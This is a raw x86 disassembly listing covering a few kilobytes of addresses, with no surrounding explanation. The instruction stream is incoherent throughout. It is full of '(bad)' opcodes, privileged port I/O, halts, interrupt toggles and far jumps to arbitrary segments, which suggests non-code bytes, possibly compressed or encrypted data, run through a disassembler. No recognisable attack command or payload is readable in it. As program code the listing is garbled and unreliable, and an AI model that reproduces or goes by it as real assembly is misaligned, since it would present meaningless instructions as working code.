  40b73e:	jmp    0x40b720
  40b740:	retf   0x97d3
  40b743:	and    ch,BYTE PTR [edx-0x44f0fcee]
  40b749:	push   ss
  40b74a:	jae    0x40b6f1
  40b74c:	pushf  
  40b74d:	push   esi
  40b74e:	rcr    DWORD PTR [eax],0xf9
  40b751:	(bad)  
  40b752:	push   cs
  40b753:	imul   ax,sp,0xff09
  40b758:	xor    bl,BYTE PTR [ecx+eiz*4+0x1]
  40b75c:	in     al,dx
  40b75d:	jl     0x40b79d
  40b75f:	xchg   edx,eax
  40b760:	fst    QWORD PTR [esi+0x7aa00495]
  40b766:	in     al,dx
  40b767:	add    al,al
  40b769:	in     eax,0xf8
  40b76b:	loopne 0x40b733
  40b76d:	gs mov edi,ecx
  40b770:	int3   
  40b771:	mov    esp,0x196359f2
  40b776:	aaa    
  40b777:	stc    
  40b778:	ret    
  40b779:	cdq    
  40b77a:	ss test eax,0x4eff565a
  40b780:	je     0x40b761
  40b782:	pushf  
  40b783:	inc    edi
  40b784:	les    ebx,FWORD PTR [edi-0x3]
  40b787:	out    dx,al
  40b788:	out    dx,eax
  40b789:	mov    dh,0x2c
  40b78b:	cmp    al,0x11
  40b78d:	dec    ebx
  40b78e:	test   DWORD PTR [ebx-0x62],0x744a064e
  40b795:	arpl   WORD PTR [ebp-0x6100aecd],si
  40b79b:	mov    dl,0x27
  40b79d:	cld    
  40b79e:	push   0xc1f598ba
  40b7a3:	daa    
  40b7a4:	jmp    0x91d:0x57879c13
  40b7ab:	adc    BYTE PTR [ebx],al
  40b7ad:	mov    al,BYTE PTR [ecx-0x5dc80afb]
  40b7b3:	jnp    0x40b7a2
  40b7b5:	xchg   ecx,eax
  40b7b6:	clc    
  40b7b7:	fcomip st,st(3)
  40b7b9:	push   ebx
  40b7ba:	mov    edx,0x4e03d3ea
  40b7bf:	in     al,0x4d
  40b7c1:	dec    esi
  40b7c2:	sbb    BYTE PTR [eax+edi*4-0x124739b8],bh
  40b7c9:	(bad)  
  40b7ca:	idiv   edi
  40b7cc:	dec    esi
  40b7cd:	hlt    
  40b7ce:	or     ah,al
  40b7d0:	xchg   esp,eax
  40b7d1:	rcl    dh,0x4a
  40b7d4:	dec    ecx
  40b7d5:	dec    ebx
  40b7d6:	push   ebx
  40b7d7:	outs   dx,DWORD PTR ds:[esi]
  40b7d8:	std    
  40b7d9:	jae    0x40b7d9
  40b7db:	dec    esi
  40b7dc:	mov    bl,0xad
  40b7de:	mov    dh,0x69
  40b7e0:	adc    al,0x53
  40b7e2:	jbe    0x40b77b
  40b7e4:	dec    ebp
  40b7e5:	(bad)  
  40b7e6:	adc    BYTE PTR [eax+eax*1+0x74],dl
  40b7ea:	mov    ebx,0x72ba5f65
  40b7ef:	xor    al,0x74
  40b7f1:	cli    
  40b7f2:	push   esp
  40b7f3:	push   ss
  40b7f4:	xor    eax,0xd88c64ab
  40b7f9:	mov    ds:0x1c1c5972,eax
  40b7fe:	call   DWORD PTR [eax-0x5c90f979]
  40b804:	mov    eax,ds:0x211ce677
  40b809:	and    al,0x2c
  40b80b:	add    DWORD PTR cs:[eax],edx
  40b80e:	and    dl,al
  40b810:	call   0xdfcf89e9
  40b815:	sbb    DWORD PTR [ecx],ebp
  40b817:	sti    
  40b818:	leave  
  40b819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b81a:	add    eax,0x554f9abe
  40b81f:	and    edx,ebp
  40b821:	push   esi
  40b822:	leave  
  40b823:	mov    bl,0x35
  40b825:	push   es
  40b826:	call   0xbe82:0x5fb957bf
  40b82d:	fiadd  WORD PTR [edi+0x19]
  40b830:	mov    al,ds:0x9446335c
  40b835:	adc    eax,0xdbd70040
  40b83a:	mov    cl,0xb8
  40b83c:	mov    ebp,0x3cfc6eb8
  40b841:	inc    edi
  40b842:	cs icebp 
  40b844:	repnz mov ?,ebx
  40b847:	jo     0x40b805
  40b849:	int3   
  40b84a:	mov    dh,BYTE PTR [ebx-0x38]
  40b84d:	sahf   
  40b84e:	xchg   dl,cl
  40b850:	inc    eax
  40b851:	sbb    eax,0xbb9cff2b
  40b856:	and    ebp,DWORD PTR [edx-0x54d8d8c5]
  40b85c:	bnd jns 0x40b80e
  40b85f:	xor    edx,DWORD PTR [eax-0x67]
  40b862:	or     al,0xbb
  40b864:	ja     0x40b818
  40b866:	rcr    BYTE PTR [ecx-0x47126246],0x90
  40b86d:	adc    BYTE PTR [ebp+0x31],0xa6
  40b871:	clc    
  40b872:	sub    BYTE PTR [eax],bl
  40b874:	inc    ebp
  40b875:	jmp    0x404:0x1d93ebbb
  40b87c:	(bad)  
  40b87d:	bound  esp,QWORD PTR [esi+0x3b]
  40b880:	in     eax,dx
  40b881:	aas    
  40b882:	inc    esp
  40b883:	mov    al,0x3f
  40b885:	fiadd  WORD PTR [ebx]
  40b887:	out    0x84,eax
  40b889:	xchg   ebx,eax
  40b88a:	sbb    al,BYTE PTR [ecx-0x3222cdc5]
  40b890:	les    ebx,FWORD PTR [ebx]
  40b892:	cwde   
  40b893:	sahf   
  40b894:	dec    esp
  40b895:	pop    eax
  40b896:	cmp    eax,0xc3c6e375
  40b89b:	mul    DWORD PTR [eax+0x1a]
  40b89e:	repz test DWORD PTR [edx-0x4801fa26],ecx
  40b8a5:	aas    
  40b8a6:	sub    ah,BYTE PTR [edi-0x284c32d8]
  40b8ac:	test   BYTE PTR [ebp-0x79],cl
  40b8af:	push   ebx
  40b8b0:	push   eax
  40b8b1:	mov    al,ds:0x26843c10
  40b8b6:	shl    BYTE PTR [ebx-0x3b657c91],1
  40b8bc:	xor    ch,al
  40b8be:	cli    
  40b8bf:	in     al,0x85
  40b8c1:	jle    0x40b85f
  40b8c3:	ficomp DWORD PTR [ecx-0x27]
  40b8c6:	sbb    ebx,esi
  40b8c8:	inc    eax
  40b8c9:	or     dl,bl
  40b8cb:	mov    eax,0x197d4d78
  40b8d0:	dec    esp
  40b8d1:	pop    ds
  40b8d2:	mov    ds:0x639f168a,al
  40b8d7:	mov    ds:0x305cebef,eax
  40b8dc:	adc    BYTE PTR [esi+0x39c2aa13],dl
  40b8e2:	scas   eax,DWORD PTR es:[edi]
  40b8e3:	push   edx
  40b8e4:	sub    dl,BYTE PTR [ecx+0x7284d3eb]
  40b8ea:	sbb    esp,eax
  40b8ec:	cmp    eax,0x7f99f36f
  40b8f1:	jmp    0x40b8b4
  40b8f3:	sbb    DWORD PTR [edi-0x3d322ff3],ebp
  40b8f9:	xor    eax,0xd159c155
  40b8fe:	retf   
  40b8ff:	adc    DWORD PTR [ebp+eax*1+0x2f],eax
  40b903:	push   edi
  40b904:	sub    eax,0xdfa6fc19
  40b909:	xchg   DWORD PTR [esi],esi
  40b90b:	sbb    DWORD PTR [ebp+0x52086cfc],ecx
  40b911:	pop    es
  40b912:	xor    esp,DWORD PTR [edi+0x7a]
  40b915:	add    esi,DWORD PTR [esi-0x5]
  40b918:	and    eax,0x6a4d8217
  40b91d:	jmp    0x65e16eb3
  40b922:	cmc    
  40b923:	mov    ds:0x2cb45fa4,eax
  40b928:	pusha  
  40b929:	mov    BYTE PTR [edi],dh
  40b92b:	mov    BYTE PTR [ebp+0x53],dh
  40b92e:	bound  esp,QWORD PTR [eax+edi*2]
  40b931:	mov    ds:0x649308ef,eax
  40b936:	xor    ah,bh
  40b938:	xchg   ebp,eax
  40b939:	(bad)  
  40b93a:	jge    0x40b8ca
  40b93c:	push   esp
  40b93d:	not    BYTE PTR [ecx-0x8]
  40b940:	xor    cl,0x79
  40b943:	sub    edi,DWORD PTR [bp-0xf]
  40b947:	scas   eax,DWORD PTR es:[edi]
  40b948:	test   BYTE PTR [edi+ebx*2+0x149baa7e],bl
  40b94f:	neg    BYTE PTR [eax+0xb8fb746]
  40b955:	enter  0xbcdc,0x47
  40b959:	ret    
  40b95a:	dec    ebp
  40b95b:	and    al,0x57
  40b95d:	fdiv   QWORD PTR [edx]
  40b95f:	dec    ecx
  40b960:	or     dl,dl
  40b962:	and    BYTE PTR [ecx-0x30],cl
  40b965:	or     al,0x52
  40b967:	repz cli 
  40b969:	inc    esp
  40b96a:	outs   dx,BYTE PTR ds:[esi]
  40b96b:	jge    0x40b9ae
  40b96d:	pop    edx
  40b96e:	(bad)  
  40b970:	push   eax
  40b971:	in     eax,0xd9
  40b973:	pop    eax
  40b974:	dec    esi
  40b975:	aad    0xe5
  40b977:	orps   xmm2,xmm5
  40b97a:	iret   
  40b97b:	stc    
  40b97c:	pop    esi
  40b97d:	cli    
  40b97e:	pushf  
  40b97f:	data16 daa 
  40b981:	aaa    
  40b982:	cmp    al,0xb0
  40b984:	xor    edi,DWORD PTR [ecx-0x34]
  40b987:	ds dec ebx
  40b989:	stc    
  40b98a:	scas   eax,DWORD PTR es:[edi]
  40b98b:	das    
  40b98c:	lock jmp 0x6611:0x69f89148
  40b994:	jge    0x40b924
  40b996:	cmp    eax,DWORD PTR [ecx+0x2f]
  40b999:	pop    ebp
  40b99a:	cwde   
  40b99b:	mov    esi,0xe444a347
  40b9a0:	rcr    BYTE PTR [edi+ebx*2+0x34],1
  40b9a4:	pop    ss
  40b9a5:	push   esi
  40b9a6:	clc    
  40b9a7:	test   eax,0xbd09d93b
  40b9ac:	icebp  
  40b9ad:	jmp    0x12b1da10
  40b9b2:	jl     0x40b9d3
  40b9b4:	dec    edx
  40b9b5:	(bad)  
  40b9b6:	idiv   DWORD PTR [edx]
  40b9b8:	lock test DWORD PTR [esi+0x40486a11],edx
  40b9bf:	ja     0x40b96a
  40b9c1:	dec    esp
  40b9c2:	cld    
  40b9c3:	push   esi
  40b9c4:	mov    edi,0xc749210f
  40b9c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9ca:	and    dh,BYTE PTR [ecx+ecx*4-0x4b79274a]
  40b9d1:	xor    ah,BYTE PTR [ebx]
  40b9d3:	push   esi
  40b9d4:	fnstsw WORD PTR [ebp-0x40]
  40b9d7:	inc    esi
  40b9d8:	shl    BYTE PTR [esi+edi*4],0xc0
  40b9dc:	ror    BYTE PTR [eax-0x4280f978],0x8d
  40b9e3:	(bad)  
  40b9e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9e5:	mov    edx,0xf951e562
  40b9ea:	xchg   ebp,eax
  40b9eb:	cs (bad) 
  40b9ed:	ja     0x40ba0d
  40b9ef:	mov    BYTE PTR fs:[ecx+ebp*8+0x2b],0xae
  40b9f5:	cmp    cl,BYTE PTR ds:0xb2fcb8fe
  40b9fb:	jecxz  0x40ba3b
  40b9fd:	push   0xffffff87
  40b9ff:	inc    eax
  40ba00:	xor    eax,0x4b75f630
  40ba05:	mov    esi,0xb91c8296
  40ba0a:	mov    eax,0x99f6a0ee
  40ba0f:	pop    ebp
  40ba10:	jle    0x40ba06
  40ba12:	dec    ebp
  40ba13:	mov    ds:0x58ab60dd,al
  40ba18:	out    0xcf,eax
  40ba1a:	fiadd  WORD PTR [ebx]
  40ba1c:	retf   
  40ba1d:	int3   
  40ba1e:	sbb    BYTE PTR [eax-0xc],dh
  40ba21:	mov    bx,0x20c6
  40ba25:	mov    al,ds:0x3f21050b
  40ba2a:	ja     0x40ba72
  40ba2c:	mov    edx,0x2812c1d6
  40ba31:	std    
  40ba32:	jnp    0x40ba49
  40ba34:	xor    ebp,edx
  40ba36:	mov    dl,0x5a
  40ba38:	dec    edi
  40ba39:	jne    0x40ba37
  40ba3b:	rcr    BYTE PTR [ebx+0x75],1
  40ba3e:	inc    esp
  40ba3f:	adc    DWORD PTR [ebp+edx*4+0x6c],edi
  40ba43:	pop    ebx
  40ba44:	imul   ebp,DWORD PTR [ebp+ecx*4-0x6cc85772],0x3a
  40ba4c:	mov    esp,0xdc94c0e8
  40ba51:	and    al,0x81
  40ba53:	outs   dx,BYTE PTR ds:[esi]
  40ba54:	jp     0x40ba63
  40ba56:	xchg   DWORD PTR [ecx],edx
  40ba58:	jle    0x40ba3d
  40ba5a:	imul   DWORD PTR [esi]
  40ba5c:	or     edx,esp
  40ba5e:	pop    esi
  40ba5f:	scas   al,BYTE PTR es:[edi]
  40ba60:	adc    al,0xe1
  40ba62:	mov    ch,0xf8
  40ba64:	(bad)  
  40ba65:	mov    ebx,0x7177f471
  40ba6a:	xor    edx,esi
  40ba6c:	and    ecx,DWORD PTR [eax+ecx*4+0x3c8cfda4]
  40ba73:	and    DWORD PTR [eax-0x2ef2c317],ebp
  40ba79:	and    eax,0xd7770d99
  40ba7e:	jmp    0xe96a:0x1a997664
  40ba85:	call   0xeb30:0x4cb23423
  40ba8c:	add    al,0x43
  40ba8e:	aad    0x12
  40ba90:	ror    esi,0xd2
  40ba93:	retf   
  40ba94:	sbb    edx,esp
  40ba96:	pop    eax
  40ba97:	or     eax,0xf34af382
  40ba9c:	cwde   
  40ba9d:	out    0x25,eax
  40ba9f:	(bad)  
  40baa0:	sub    al,0xeb
  40baa2:	sub    eax,0x437f5c86
  40baa7:	stos   BYTE PTR es:[edi],al
  40baa8:	sbb    al,0x33
  40baaa:	pop    ebp
  40baab:	pop    ss
  40baac:	call   0xe8ce:0xdd6a6495
  40bab3:	push   esi
  40bab4:	push   0xc51970c1
  40bab9:	hlt    
  40baba:	cmp    cl,dl
  40babc:	jmp    0x40baa7
  40babe:	xchg   ebp,eax
  40babf:	shl    DWORD PTR [eax-0x6d133bcf],cl
  40bac5:	repz je 0x40bab3
  40bac8:	fs int3 
  40baca:	lds    edx,FWORD PTR [esp+ebx*1]
  40bacd:	in     eax,0xac
  40bacf:	xchg   edx,eax
  40bad0:	(bad)  
  40bad2:	mov    dh,0x12
  40bad4:	jge    0x40bad4
  40bad6:	or     eax,0xec2d62b6
  40badb:	cdq    
  40badc:	and    esi,ebp
  40bade:	fwait
  40badf:	inc    ecx
  40bae0:	and    ebx,DWORD PTR [eax-0x29]
  40bae3:	sbb    al,BYTE PTR ds:0xcb63d54c
  40bae9:	and    al,0x53
  40baeb:	sub    eax,0x90a46669
  40baf0:	cmp    al,0xe2
  40baf2:	xchg   bh,dh
  40baf4:	push   0x1d1648c
  40baf9:	aad    0x48
  40bafb:	in     eax,0x22
  40bafd:	pop    ebp
  40bafe:	cmp    DWORD PTR [ebx+0x7a7682d1],eax
  40bb04:	inc    edx
  40bb05:	scas   al,BYTE PTR es:[edi]
  40bb06:	ror    DWORD PTR [ebx],1
  40bb08:	fcmove st,st(6)
  40bb0a:	shl    BYTE PTR [esi],cl
  40bb0c:	inc    eax
  40bb0d:	in     eax,dx
  40bb0e:	jne    0x40bb3d
  40bb10:	loop   0x40bac6
  40bb12:	inc    esi
  40bb13:	in     eax,0x36
  40bb15:	push   ds
  40bb16:	stc    
  40bb17:	ds mov esp,0xe435ee86
  40bb1d:	pop    esi
  40bb1e:	jle    0x40bb91
  40bb20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb21:	jmp    0xbc5ffef3
  40bb26:	xor    eax,0x81e27f1b
  40bb2b:	jmp    0xca9fa1f6
  40bb30:	sub    DWORD PTR [edx+0x275208e5],esp
  40bb36:	adc    ebx,DWORD PTR [ecx]
  40bb38:	shl    BYTE PTR [edi+0x19],0xcf
  40bb3c:	(bad)  
  40bb3d:	imul   ebx,DWORD PTR [eax-0x6b9e1c12],0xffffffda
  40bb44:	lock and DWORD PTR [ebx],esi
  40bb47:	cld    
  40bb48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb49:	mov    eax,ds:0x3757103f
  40bb4e:	mov    eax,0xab29f75b
  40bb53:	shr    DWORD PTR ds:0x28e6cc5,0xea
  40bb5a:	jmp    0xecefe229
  40bb5f:	push   ss
  40bb60:	enter  0x3143,0xfd
  40bb64:	pop    esp
  40bb65:	pop    es
  40bb66:	push   edx
  40bb67:	mov    WORD PTR [ecx+edi*4+0x2ac54532],ds
  40bb6e:	dec    esi
  40bb6f:	out    dx,eax
  40bb70:	add    cl,BYTE PTR [edi+ebp*2-0x23]
  40bb74:	mov    bl,0xad
  40bb76:	sbb    eax,0x52c5bb8
  40bb7b:	jp     0x40bb8d
  40bb7d:	in     al,0xcf
  40bb7f:	js     0x40bb29
  40bb81:	fwait
  40bb82:	inc    edi
  40bb83:	sbb    BYTE PTR [eax-0x56c79ed2],al
  40bb89:	loope  0x40bb10
  40bb8b:	pushf  
  40bb8c:	rcl    DWORD PTR [ebx+ecx*2],cl
  40bb8f:	fild   DWORD PTR [edi]
  40bb91:	mov    ?,WORD PTR [ecx-0x5e7414d9]
  40bb97:	fs xchg ebx,eax
  40bb99:	in     eax,dx
  40bb9a:	sbb    edx,DWORD PTR cs:[ecx+0x51b80fef]
  40bba1:	sbb    eax,0xca0fd1f8
  40bba6:	enter  0x5413,0xe1
  40bbaa:	push   0xffffffa4
  40bbac:	jo     0x40bbc2
  40bbae:	pop    esp
  40bbaf:	lods   eax,DWORD PTR ds:[esi]
  40bbb0:	cmc    
  40bbb1:	xor    DWORD PTR [esi-0x33],edi
  40bbb4:	push   ss
  40bbb5:	pop    esi
  40bbb6:	mov    al,0xc2
  40bbb8:	xchg   edi,eax
  40bbb9:	mov    ah,0x8d
  40bbbb:	call   0x1f5128df
  40bbc0:	pusha  
  40bbc1:	mov    bl,0xff
  40bbc3:	dec    edx
  40bbc4:	sub    BYTE PTR [bx],ch
  40bbc7:	mov    dl,0x15
  40bbc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbca:	pop    es
  40bbcb:	cmp    eax,DWORD PTR [edx+0x186ff2db]
  40bbd1:	nop
  40bbd2:	and    edx,DWORD PTR [edx+0x451bbbaf]
  40bbd8:	push   edx
  40bbd9:	hlt    
  40bbda:	mov    ebp,0x849c51e6
  40bbdf:	sub    DWORD PTR [edx+0x2c35526e],esp
  40bbe5:	sti    
  40bbe6:	cli    
  40bbe7:	(bad)  
  40bbe8:	cdq    
  40bbe9:	pop    ds
  40bbea:	pop    esi
  40bbeb:	sub    eax,0x9acab11a
  40bbf0:	daa    
  40bbf1:	push   edi
  40bbf2:	xor    DWORD PTR [eax+esi*1-0x21321df9],0xb86512f
  40bbfd:	enter  0x2237,0xaf
  40bc01:	(bad)  
  40bc02:	lea    eax,[ebx-0x1c]
  40bc05:	mov    bh,0xb1
  40bc08:	sub    eax,0x91f72cb6
  40bc0d:	in     eax,dx
  40bc0e:	mov    ds:0xd48d98b1,eax
  40bc13:	xlat   BYTE PTR ds:[ebx]
  40bc14:	rcr    BYTE PTR [eax-0x879cf66],1
  40bc1a:	adc    eax,0xf3033e59
  40bc1f:	jp     0x40bc28
  40bc21:	lock xor esp,esp
  40bc24:	outs   dx,DWORD PTR ds:[esi]
  40bc25:	cmc    
  40bc26:	push   ds
  40bc27:	loope  0x40bca3
  40bc29:	(bad)  
  40bc2a:	call   0x6bb4b823
  40bc2f:	sub    eax,0x15ec5577
  40bc34:	push   ebp
  40bc35:	ins    BYTE PTR es:[edi],dx
  40bc36:	(bad)  
  40bc37:	jmp    0x8b25:0xa0fe9fdd
  40bc3e:	aaa    
  40bc3f:	lods   al,BYTE PTR ds:[esi]
  40bc40:	xchg   ebx,eax
  40bc41:	sahf   
  40bc42:	inc    esi
  40bc43:	push   esp
  40bc44:	mov    ecx,DWORD PTR [ebp+0x60]
  40bc47:	pop    eax
  40bc48:	inc    ebp
  40bc49:	imul   edi,DWORD PTR [ebx-0x10],0x52
  40bc4d:	es out dx,al
  40bc4f:	aam    0x8
  40bc51:	iret   
  40bc52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc53:	div    al
  40bc55:	add    DWORD PTR [edx-0x7916241b],esp
  40bc5b:	and    ch,ch
  40bc5d:	sbb    DWORD PTR [ecx+0xc],ebx
  40bc60:	sbb    esp,0x530859df
  40bc66:	sbb    cl,BYTE PTR [ecx+0x27]
  40bc69:	ret    0x8d93
  40bc6c:	imul   ebx,DWORD PTR [eax-0x686c859d],0x3a
  40bc73:	clc    
  40bc74:	pop    esp
  40bc75:	cmp    al,0x36
  40bc77:	cdq    
  40bc78:	cs inc ebx
  40bc7a:	mov    WORD PTR [ebx-0x953e661],?
  40bc80:	loop   0x40bcbe
  40bc82:	sub    BYTE PTR [esi],0x2e
  40bc85:	jo     0x40bcf7
  40bc87:	jmp    0x40bd04
  40bc89:	mov    dl,0x98
  40bc8b:	mov    ds:0xae3e4068,eax
  40bc90:	xor    esi,DWORD PTR [eax]
  40bc92:	daa    
  40bc93:	sbb    edi,DWORD PTR [esi+0x3]
  40bc96:	mov    edx,0x22a0320a
  40bc9b:	and    ebp,DWORD PTR [esi]
  40bc9d:	lahf   
  40bc9e:	jecxz  0x40bd02
  40bca0:	pop    ebx
  40bca1:	loope  0x40bc2f
  40bca3:	jecxz  0x40bce6
  40bca5:	or     al,0x9b
  40bca7:	add    eax,0xf6dd8194
  40bcac:	lds    edx,FWORD PTR [ebx-0x4f430f6e]
  40bcb2:	stc    
  40bcb3:	fisttp WORD PTR [ecx-0xfdd7076]
  40bcb9:	loop   0x40bc6b
  40bcbb:	push   eax
  40bcbc:	dec    esi
  40bcbd:	int    0x89
  40bcbf:	adc    edx,DWORD PTR [ecx]
  40bcc1:	lds    edi,FWORD PTR [edx-0x16191abe]
  40bcc7:	sbb    BYTE PTR [esp+esi*1],bl
  40bcca:	pop    esi
  40bccb:	pop    edi
  40bccc:	xchg   esi,eax
  40bccd:	sbb    edx,ebp
  40bccf:	or     DWORD PTR [ebx],ecx
  40bcd1:	mov    WORD PTR [edx-0x3a],ss
  40bcd4:	dec    eax
  40bcd5:	cld    
  40bcd6:	push   0xffffff8b
  40bcd8:	into   
  40bcd9:	shl    bh,1
  40bcdb:	or     bl,dh
  40bcdd:	ins    DWORD PTR es:[edi],dx
  40bcde:	(bad)  
  40bcdf:	jbe    0x40bcb0
  40bce1:	ror    DWORD PTR [esi],0x17
  40bce4:	mov    ah,0x9b
  40bce6:	cmp    al,0xa2
  40bce8:	loopne 0x40bc6d
  40bcea:	xchg   ebx,eax
  40bceb:	popf   
  40bcec:	test   BYTE PTR [edx],bl
  40bcee:	daa    
  40bcef:	xchg   esp,eax
  40bcf0:	adc    BYTE PTR [edi-0x8],bh
  40bcf3:	ss mov esp,0x779f7960
  40bcf9:	jmp    0x8488:0xa1cf8986
  40bd00:	inc    DWORD PTR [ebx+0x42]
  40bd03:	pop    eax
  40bd04:	retf   
  40bd05:	ins    DWORD PTR es:[edi],dx
  40bd06:	cwde   
  40bd07:	shl    cl,cl
  40bd09:	and    bh,BYTE PTR [eax+esi*2+0x3d3cb65b]
  40bd10:	dec    ebp
  40bd11:	and    bh,bh
  40bd13:	mov    ecx,0x7005b72a
  40bd18:	or     BYTE PTR [eax],0xe5
  40bd1b:	shr    cl,1
  40bd1d:	jl     0x40bd0c
  40bd1f:	xchg   ebp,eax
  40bd20:	dec    edi
  40bd21:	or     edx,DWORD PTR [eax+0x7c]
  40bd24:	jp     0x40bd9f
  40bd26:	jbe    0x40bd2a
  40bd28:	adc    BYTE PTR [eax-0x67],0x72
  40bd2c:	enter  0x96a0,0xd
  40bd30:	ds cdq 
  40bd32:	push   es
  40bd33:	push   ss
  40bd34:	aad    0x62
  40bd36:	and    dh,BYTE PTR [ebp+0x3cab0d18]
  40bd3c:	sbb    cl,BYTE PTR [eax+0x40]
  40bd3f:	inc    eax
  40bd40:	fs mov eax,ecx
  40bd43:	or     edi,ebp
  40bd45:	pop    eax
  40bd46:	mov    edi,0xb4a0f2e9
  40bd4b:	and    al,0xd7
  40bd4d:	fwait
  40bd4e:	pop    esp
  40bd4f:	pushf  
  40bd50:	cwde   
  40bd51:	jnp    0x40bcda
  40bd53:	sar    ch,0xac
  40bd56:	js     0x40bd08
  40bd58:	pop    es
  40bd59:	in     eax,0x23
  40bd5b:	stos   DWORD PTR es:[edi],eax
  40bd5c:	out    dx,eax
  40bd5d:	je     0x40bd49
  40bd5f:	mov    cl,0x8d
  40bd61:	jns    0x40bd43
  40bd63:	adc    al,BYTE PTR [esp+ebp*2-0x76402d58]
  40bd6a:	daa    
  40bd6b:	scas   eax,DWORD PTR es:[edi]
  40bd6c:	inc    esp
  40bd6d:	popa   
  40bd6e:	pop    edi
  40bd6f:	out    0x96,al
  40bd71:	in     eax,0xc0
  40bd73:	sbb    BYTE PTR [edi+ebx*4],0x43
  40bd77:	push   edi
  40bd78:	mov    BYTE PTR [edx-0x67],al
  40bd7b:	jmp    0x3b0e67db
  40bd80:	call   0x1a02:0xeba5785
  40bd87:	aas    
  40bd88:	jnp    0x40bde3
  40bd8a:	imul   eax,DWORD PTR [ecx],0x25
  40bd8d:	imul   edi,DWORD PTR cs:[ebp-0x29b2df51],0x70671d22
  40bd98:	test   eax,0xe7c8c7b6
  40bd9d:	adc    BYTE PTR [edi+0x24],dh
  40bda0:	cmp    cl,BYTE PTR [edx+0x5e]
  40bda3:	push   esi
  40bda4:	inc    esi
  40bda5:	push   ss
  40bda6:	aas    
  40bda7:	jp     0x40bd5c
  40bda9:	jl     0x40bd5a
  40bdab:	in     al,dx
  40bdac:	jns    0x40bd73
  40bdae:	jnp    0x40bdfc
  40bdb0:	in     eax,0x69
  40bdb2:	cwde   
  40bdb3:	into   
  40bdb4:	cmp    BYTE PTR [ebx+0x2e174d9b],cl
  40bdba:	jg     0x40be36
  40bdbc:	push   eax
  40bdbd:	lds    edx,FWORD PTR [edi+0x40f34622]
  40bdc3:	adc    dl,dl
  40bdc5:	adc    ebx,0xffffffdf
  40bdc8:	out    dx,al
  40bdc9:	aam    0x6e
  40bdcb:	push   0x30
  40bdcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdce:	jecxz  0x40bdb0
  40bdd0:	test   DWORD PTR [edi],0x492b04a0
  40bdd6:	out    0x21,eax
  40bdd8:	inc    esi
  40bdd9:	and    DWORD PTR [esi],ebp
  40bddb:	mov    ebp,DWORD PTR [ebx]
  40bddd:	bound  eax,QWORD PTR [ebx+edi*1]
  40bde0:	js     0x40bdf4
  40bde2:	inc    edx
  40bde3:	ins    BYTE PTR es:[edi],dx
  40bde4:	or     cl,ch
  40bde6:	adc    BYTE PTR [edx+0x24],dl
  40bde9:	loopne 0x40bdbc
  40bdeb:	adc    al,0xef
  40bded:	add    DWORD PTR [eax],esi
  40bdef:	inc    ebx
  40bdf0:	dec    esp
  40bdf1:	pusha  
  40bdf2:	add    BYTE PTR [ecx],0x58
  40bdf5:	lea    eax,[ebp+0xaf48e7b]
  40bdfb:	xchg   ecx,eax
  40bdfc:	pushf  
  40bdfd:	pop    es
  40bdfe:	je     0x40bdfc
  40be00:	ins    BYTE PTR es:[edi],dx
  40be01:	sub    al,0x7
  40be03:	jnp    0x40bda7
  40be05:	pop    ebp
  40be06:	add    DWORD PTR [esi+0x56],esi
  40be09:	hlt    
  40be0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be0b:	shl    BYTE PTR [esi],cl
  40be0d:	dec    esp
  40be0e:	mov    ch,0x8f
  40be10:	in     al,0x8a
  40be12:	and    al,0x2e
  40be14:	add    al,0xe9
  40be16:	mov    esi,0x85b6af
  40be1b:	test   DWORD PTR [ebx-0x52ab6acc],eax
  40be21:	pop    edx
  40be22:	mov    eax,0xb9ed5021
  40be27:	les    edi,FWORD PTR [eax-0x3cbefde]
  40be2d:	sub    BYTE PTR [eax+0x65],0x77
  40be31:	pop    ss
  40be32:	bound  esp,QWORD PTR [edx+ecx*4-0x5a]
  40be36:	shr    edx,1
  40be38:	mov    eax,0xe1a9de23
  40be3d:	add    eax,0x8cfe4453
  40be42:	xlat   BYTE PTR ds:[ebx]
  40be43:	and    DWORD PTR ds:0x95b749a5,edx
  40be49:	xchg   esp,eax
  40be4a:	fsubr  DWORD PTR [eax]
  40be4c:	pop    ebp
  40be4d:	sub    al,al
  40be4f:	ja     0x40be4f
  40be51:	loop   0x40be22
  40be53:	mov    edx,0xc2c90146
  40be58:	aam    0xc4
  40be5a:	pop    ebp
  40be5b:	adc    ecx,DWORD PTR [eax+edx*8-0x43f101dc]
  40be62:	pop    edi
  40be63:	push   edi
  40be64:	mov    esi,0xd03b7bae
  40be69:	sti    
  40be6a:	or     al,0x5a
  40be6c:	cmp    esi,DWORD PTR [edx-0x4c]
  40be6f:	ss push ecx
  40be71:	mov    bh,0x18
  40be73:	and    BYTE PTR [ebx],0xf4
  40be76:	inc    edx
  40be77:	push   ebx
  40be78:	dec    esi
  40be79:	xor    al,0x89
  40be7b:	cmp    bh,ch
  40be7d:	xor    bl,bl
  40be7f:	ret    
  40be80:	dec    esp
  40be81:	xchg   edx,eax
  40be82:	repz and al,BYTE PTR [ebx-0x693b1ce8]
  40be89:	test   BYTE PTR [ebx+0x51ccae2],ah
  40be8f:	icebp  
  40be90:	out    dx,al
  40be91:	push   esp
  40be92:	enter  0x5685,0xe1
  40be96:	lds    esi,FWORD PTR [bx+si-0x24ae]
  40be9b:	add    edi,DWORD PTR [eax+0x23fd675e]
  40bea1:	inc    edx
  40bea2:	pmaxsw mm2,QWORD PTR [esi+0x59d40a1]
  40bea9:	and    esp,DWORD PTR [esi]
  40beab:	fnstenv [ecx+0x34]
  40beae:	cmp    esp,esi
  40beb0:	popf   
  40beb1:	add    DWORD PTR [eax],eax
  40beb3:	shl    BYTE PTR [edx],1
  40beb5:	or     BYTE PTR [edx],ah
  40beb7:	inc    esi
  40beb8:	push   cs
  40beb9:	push   ds
  40beba:	fnstsw WORD PTR [ecx]
  40bebc:	(bad)  [ebx+0x237e6191]
  40bec2:	mov    BYTE PTR [ebp-0x5d89bdfc],bl
  40bec8:	pop    ebx
  40bec9:	push   ecx
  40beca:	mov    al,0xc9
  40becc:	and    eax,0x2624ec00
  40bed1:	jmp    0x40bee1
  40bed3:	pop    ebx
